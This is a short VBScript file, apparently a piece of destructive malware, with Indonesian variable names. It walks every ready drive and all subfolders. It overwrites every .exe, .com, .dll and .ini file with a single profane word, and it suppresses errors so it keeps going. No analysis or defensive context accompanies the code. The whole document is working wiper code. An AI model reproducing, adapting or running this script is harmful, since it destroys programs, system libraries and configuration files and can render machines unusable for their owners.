   Set Fso = createobject("scripting.filesystemobject")
   Set Drives=fso.drives
   For Each Drive in Drives
   If drive.isready then
   Cari drive & "\"
   end If
   Next
   Sub Cari(FIL)
   On Error Resume Next
   Set Rusak = FSO.GetFolder(FIL)
   For Each Kacau In Rusak.Files
   If fso.GetExtensionName(Kacau.path)="exe" or fso.GetExtensionName(Kacau.path)="com" or fso.GetExtensionName(Kacau.path)="dll" or fso.GetExtensionName(Kacau.path)="ini" then
   Set dropper = Fso.createtextfile(Kacau.path, True)
   dropper.writeline "FUCKER"
   dropper.Close
   end if
   Next
   For Each Lagi In Rusak.SubFolders
   Cari(Lagi.Path)
   Next
   End Sub


